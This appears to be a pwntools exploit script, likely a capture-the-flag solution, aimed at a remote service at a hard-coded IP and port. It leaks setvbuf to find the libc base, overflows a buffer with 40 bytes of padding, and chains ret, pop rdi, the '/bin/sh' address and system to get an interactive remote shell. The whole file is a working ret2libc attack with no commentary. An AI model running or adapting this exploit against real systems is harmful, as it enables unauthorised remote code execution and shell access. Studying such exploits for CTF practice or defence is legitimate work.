from pwn import *

context.arch = 'amd64'
context. log_level = 'debug'

ip = '122.38.251.9'
port = 31337

libc = ELF('./libc.so.6')
p = remote(ip, port)

p.recvuntil(b'setvbuf : ')
setvbuf_address = int(p.recvline().strip(), 16)

offset = 40
libc_base = setvbuf_address - libc.symbols['setvbuf']
system_address = libc_base + libc.symbols['system']
bin_sh_address = libc_base + next(libc.search(b'/bin/sh'))
# exit_address = libc_base + libc.symbols['exit']
pop_rdi = 0x4012a3
ret = 0x40101a

payload = b'A' * offset
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh_address)
payload += p64(system_address)
# payload += p64(exit_address)

p.sendline(payload)

p.interactive()
